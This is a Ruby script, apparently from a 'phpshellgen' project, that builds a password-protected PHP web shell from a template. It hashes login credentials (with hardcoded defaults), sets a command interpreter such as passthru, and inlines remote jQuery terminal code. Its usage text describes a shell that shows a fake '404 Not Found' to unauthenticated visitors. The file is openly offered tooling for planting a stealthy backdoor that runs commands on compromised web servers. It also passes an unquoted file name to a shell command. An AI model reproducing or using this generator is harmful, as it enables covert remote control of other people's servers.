#!/usr/bin/env ruby
require 'rubygems'
require 'getoptlong'
require 'digest/sha1'
require 'open-uri'
#
def usage
	puts "PHP-Shell Generator"
	puts "http://www.cixtor.com/phpshell"
	puts "https://github.com/cixtor/phpshellgen"
	puts
	puts "Options:"
	puts "  -h | --help     = Print this message with the list of available options."
	puts "  -i | --input    = Specify the shell template to use in compilation."
	puts "  -o | --output   = Specify the filename of the output (you should specify the extension too)."
	puts "  -s | --shell    = Specify the default interpreter to use, you can chage this using the method 'set_interpreter(shell_exec)' once you are logged in."
	puts "  -u | --username = Specify the username to log into the php-shell, if you are not authenticated the shell will responde with a '404 Not Found'."
	puts "  -p | --password = Specify the password to log into the php-shell."
	puts "  -l | --lint     = Enable the check of the php-shell using the linter utility of PHP."
	puts "Methods:"
	puts "  set_interpreter = Change the default interpreter used in the compiled php-shell: set_interpreter(shell_exec)"
	puts "  logout          = Destroy the current session and display the 'Not Found' message."
	puts "  cd 'path'       = Change the current working directory and store this value in session to stay present while you execute other commands."
	puts "Usage:"
	puts "  ./compile.rb -i template.php -o shell.php"
	puts "  ./compile.rb -i template.php -s 'shell_exec'"
	puts "  ./compile.rb -i template.php -o shell.php -u 'USERNAME' -p 'PASSWORD'"
	exit
end
def get_jquery
	# request = open('http://code.jquery.com/jquery.min.js')
	request = open('http://www.cixtor.com/assets/jquery.min.js')
	request.read
end
def get_jquery_terminal
	request = open('http://www.cixtor.com/assets/jquery.terminal.min.js')
	request.read
end
#
config = {
	:input => nil,
	:output => nil,
	:shell => 'passthru',
	:username => 'cixtor',
	:password => '98ogHDPcPU',
	:username_hash => '',
	:password_hash => '',
	:lint => false
}
options = GetoptLong.new(
	[ '--input', '-i', GetoptLong::REQUIRED_ARGUMENT ],
	[ '--output', '-o', GetoptLong::REQUIRED_ARGUMENT ],
	[ '--shell', '-s', GetoptLong::OPTIONAL_ARGUMENT ],
	[ '--username', '-u', GetoptLong::OPTIONAL_ARGUMENT ],
	[ '--password', '-p', GetoptLong::OPTIONAL_ARGUMENT ],
	[ '--lint', '-l', GetoptLong::NO_ARGUMENT ],
	[ '--help', '-h', GetoptLong::NO_ARGUMENT ]
)
#
begin
	options.each do |option, args|
		case option
			when '--input'
				config[:input] = args
			when '--output'
				config[:output] = args
			when '--shell'
				config[:shell] = args
			when '--username'
				config[:username] = args
			when '--password'
				config[:password] = args
			when '--lint'
				config[:lint] = true
			when '--help'
				usage
			else raise('Invalid option, use --help to get a list of available options.')
		end
	end
rescue GetoptLong::InvalidOption => e
	puts 0
end
#
if config[:input] and config[:output] then
	puts "\e[0;93mCompiling...\e[0m"
	config[:username_hash] = Digest::SHA1.hexdigest(config[:username])
	config[:password_hash] = Digest::SHA1.hexdigest(config[:password])
	#
	puts "Writing compiled source into file: '\e[0;94m#{config[:output]}\e[0m'"
	output = File.new(config[:output],'w')
	template = File.open(config[:input],'r')
	template.each_line do |line|
		line = line.chomp
		if line.match(/'username'=>'([a-z0-9]{40})',/) then
			puts "Hashing username: \e[0;93m#{config[:username]}\e[0m"
			output.write("'username'=>'#{config[:username_hash]}',")
		elsif line.match(/'password'=>'([a-z0-9]{40})',/) then
			puts "Hashing password: \e[0;93m#{config[:password]}\e[0m"
			output.write("'password'=>'#{config[:password_hash]}',")
		elsif line.match(/'interpreter'=>'(.*)',/)
			puts "Settings default interpreter: \e[0;93m#{config[:shell]}\e[0m"
			output.write("'interpreter'=>'#{config[:shell]}',")
		elsif line.match(/<script type="text\/javascript" src="jquery.min.js"><\/script>/) then
			puts "Adding jQuery support."
			output.write("<script type='text/javascript'>")
			output.write(get_jquery)
			output.write("</script>")
		elsif line.match(/^<\?php$/) then
			output.write("<?php ")
		elsif line.match(/<script type="text\/javascript" src="jquery.terminal.min.js"><\/script>/) then
			puts "Adding jQuery.Terminal support."
			output.write("<script type='text/javascript'>")
			output.write(get_jquery_terminal)
			output.write("</script>")
		else
			line = line.gsub("\t",'')
			output.write(line)
		end
	end
	%x{php -l #{config[:output]}} if config[:lint]==true
	puts "\e[0;92mFinished.\e[0m"
	output.close
else
	usage
end